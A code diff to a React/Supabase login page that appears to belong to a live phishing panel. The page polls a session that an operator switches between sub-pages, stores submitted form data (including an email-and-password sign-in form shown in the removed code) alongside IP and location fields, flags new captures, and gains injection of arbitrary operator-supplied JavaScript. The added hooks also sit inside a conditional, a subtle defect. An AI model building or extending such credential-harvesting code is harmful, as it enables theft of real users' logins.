@@ -1,3 +1,4 @@
+
 import React, { useEffect, useState } from 'react';
 import { useParams } from 'react-router-dom';
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
@@ -5,13 +6,11 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
-import { useSessionContext } from '@/contexts/SessionContext';
 import { Loader } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 
 const LoginPage = () => {
   const { sessionId } = useParams<{ sessionId: string }>();
-  const { addSessionData, getMainPageById, getSubPageById } = useSessionContext();
   const [formData, setFormData] = useState<Record<string, string>>({});
   const [session, setSession] = useState<any>(null);
   const [subPage, setSubPage] = useState<any>(null);
@@ -48,7 +47,7 @@ const LoginPage = () => {
           return;
         }
 
-        console.log('Session data:', sessionData);
+        console.log('Session data found:', sessionData);
         setSession(sessionData);
 
         // Get main page data
@@ -65,7 +64,7 @@ const LoginPage = () => {
           return;
         }
 
-        console.log('Main page data:', mainPageData);
+        console.log('Main page data found:', mainPageData);
         setMainPage(mainPageData);
 
         // Get sub page data
@@ -82,7 +81,7 @@ const LoginPage = () => {
           return;
         }
 
-        console.log('Sub page data:', subPageData);
+        console.log('Sub page data found:', subPageData);
         setSubPage(subPageData);
         setPageLoading(false);
       } catch (err) {
@@ -95,7 +94,7 @@ const LoginPage = () => {
     fetchSession();
   }, [sessionId]);
 
-  // Poll for session updates
+  // Poll for session updates every 3 seconds
   useEffect(() => {
     if (!sessionId || !session) return;
 
@@ -108,30 +107,29 @@ const LoginPage = () => {
           .eq('active', true)
           .single();
 
-        if (!error && updatedSession) {
-          if (updatedSession.current_sub_page_id !== session.current_sub_page_id) {
-            console.log('Session updated, new sub page:', updatedSession.current_sub_page_id);
-            setSession(updatedSession);
-            
-            // Fetch new sub page data
-            const { data: newSubPageData, error: subPageError } = await supabase
-              .from('sub_pages')
-              .select('*')
-              .eq('id', updatedSession.current_sub_page_id)
-              .single();
+        if (!error && updatedSession && updatedSession.current_sub_page_id !== session.current_sub_page_id) {
+          console.log('Session updated, fetching new sub page:', updatedSession.current_sub_page_id);
+          setSession(updatedSession);
+          
+          // Fetch new sub page data
+          const { data: newSubPageData, error: subPageError } = await supabase
+            .from('sub_pages')
+            .select('*')
+            .eq('id', updatedSession.current_sub_page_id)
+            .single();
 
-            if (!subPageError && newSubPageData) {
-              setSubPage(newSubPageData);
-              setFormData({});
-              setSubmitted(false);
-              setIsLoading(false);
-            }
+          if (!subPageError && newSubPageData) {
+            console.log('New sub page loaded:', newSubPageData);
+            setSubPage(newSubPageData);
+            setFormData({});
+            setSubmitted(false);
+            setIsLoading(false);
           }
         }
       } catch (err) {
         console.error('Error polling session:', err);
       }
-    }, 2000);
+    }, 3000);
 
     return () => clearInterval(intervalId);
   }, [sessionId, session]);
@@ -159,12 +157,23 @@ const LoginPage = () => {
       
       console.log('Submitting form data:', formData);
       
-      addSessionData(sessionId, {
-        timestamp: new Date().toISOString(),
-        ip: mockIp,
-        location: mockLocation,
-        formData
-      });
+      const { error } = await supabase
+        .from('session_data')
+        .insert({
+          session_id: sessionId,
+          timestamp: new Date().toISOString(),
+          ip_address: mockIp,
+          location: mockLocation,
+          form_data: formData
+        });
+
+      if (error) throw error;
+
+      // Update session to mark new data
+      await supabase
+        .from('sessions')
+        .update({ has_new_data: true })
+        .eq('id', sessionId);
       
       setTimeout(() => {
         setIsLoading(false);
@@ -233,7 +242,7 @@ const LoginPage = () => {
       <div className="min-h-screen flex items-center justify-center p-4">
         <Card className="w-full max-w-md">
           <CardHeader>
-            <CardTitle className="text-center">Error</CardTitle>
+            <CardTitle className="text-center text-destructive">Error</CardTitle>
           </CardHeader>
           <CardContent>
             <Alert variant="destructive">
@@ -269,7 +278,7 @@ const LoginPage = () => {
       <div className="min-h-screen flex items-center justify-center p-4">
         <Card className="w-full max-w-md">
           <CardHeader>
-            <CardTitle className="text-center">Success!</CardTitle>
+            <CardTitle className="text-center text-green-600">Success!</CardTitle>
           </CardHeader>
           <CardContent>
             <Alert>
@@ -309,23 +318,59 @@ const LoginPage = () => {
     );
   }
 
-  // If subpage has custom HTML, render it
+  // If subpage has custom HTML, render it with CSS and JS
   if (subPage.html && subPage.html.trim()) {
-    console.log('Rendering custom HTML:', subPage.html);
+    console.log('Rendering custom HTML for subpage:', subPage.name);
+    
+    // Inject CSS and JS if available
+    useEffect(() => {
+      // Inject CSS
+      if (subPage.css) {
+        const styleElement = document.createElement('style');
+        styleElement.textContent = subPage.css;
+        styleElement.id = 'custom-css';
+        document.head.appendChild(styleElement);
+        
+        return () => {
+          const existingStyle = document.getElementById('custom-css');
+          if (existingStyle) {
+            existingStyle.remove();
+          }
+        };
+      }
+    }, [subPage.css]);
+
+    useEffect(() => {
+      // Inject JS
+      if (subPage.javascript) {
+        const scriptElement = document.createElement('script');
+        scriptElement.textContent = subPage.javascript;
+        scriptElement.id = 'custom-js';
+        document.body.appendChild(scriptElement);
+        
+        return () => {
+          const existingScript = document.getElementById('custom-js');
+          if (existingScript) {
+            existingScript.remove();
+          }
+        };
+      }
+    }, [subPage.javascript]);
+
     return (
       <div className="min-h-screen flex items-center justify-center p-4">
         <div 
           id="custom-form"
-          className="w-full max-w-md"
+          className="w-full max-w-4xl"
           dangerouslySetInnerHTML={{ __html: subPage.html }} 
         />
       </div>
     );
   }
 
-  // Dynamic form based on current subpage fields or predefined forms
+  // Dynamic form based on current subpage fields
   const renderDynamicForm = () => {
-    console.log('Rendering dynamic form for sub page:', subPage);
+    console.log('Rendering dynamic form for sub page:', subPage.name);
     console.log('Sub page fields:', subPage.fields);
     
     // Check if subpage has defined fields
@@ -350,69 +395,36 @@ const LoginPage = () => {
       );
     }
 
-    // Fallback to predefined forms based on subpage ID
-    switch (subPage.id) {
-      case 'login1':
-        return (
-          <div className="grid gap-4">
-            <div className="space-y-2">
-              <Label htmlFor="email">Email</Label>
-              <Input 
-                id="email" 
-                name="email" 
-                type="email" 
-                placeholder="name@example.com" 
-                required
-                value={formData.email || ''}
-                onChange={handleInputChange}
-              />
-            </div>
-            <div className="space-y-2">
-              <Label htmlFor="password">Password</Label>
-              <Input 
-                id="password" 
-                name="password" 
-                type="password" 
-                required
-                value={formData.password || ''}
-                onChange={handleInputChange}
-              />
-            </div>
-            <Button type="submit" className="w-full">Sign In</Button>
-          </div>
-        );
-      
-      default:
-        return (
-          <div className="grid gap-4">
-            <div className="space-y-2">
-              <Label htmlFor="email">Email</Label>
-              <Input 
-                id="email" 
-                name="email" 
-                type="email" 
-                placeholder="name@example.com" 
-                required
-                value={formData.email || ''}
-                onChange={handleInputChange}
-              />
-            </div>
-            <div className="space-y-2">
-              <Label htmlFor="message">Message</Label>
-              <Input 
-                id="message" 
-                name="message" 
-                type="text" 
-                placeholder="Your message" 
-                required
-                value={formData.message || ''}
-                onChange={handleInputChange}
-              />
-            </div>
-            <Button type="submit" className="w-full">Submit</Button>
-          </div>
-        );
-    }
+    // Default form
+    return (
+      <div className="grid gap-4">
+        <div className="space-y-2">
+          <Label htmlFor="email">Email</Label>
+          <Input 
+            id="email" 
+            name="email" 
+            type="email" 
+            placeholder="name@example.com" 
+            required
+            value={formData.email || ''}
+            onChange={handleInputChange}
+          />
+        </div>
+        <div className="space-y-2">
+          <Label htmlFor="message">Message</Label>
+          <Input 
+            id="message" 
+            name="message" 
+            type="text" 
+            placeholder="Your message" 
+            required
+            value={formData.message || ''}
+            onChange={handleInputChange}
+          />
+        </div>
+        <Button type="submit" className="w-full">Submit</Button>
+      </div>
+    );
   };
 
   return (
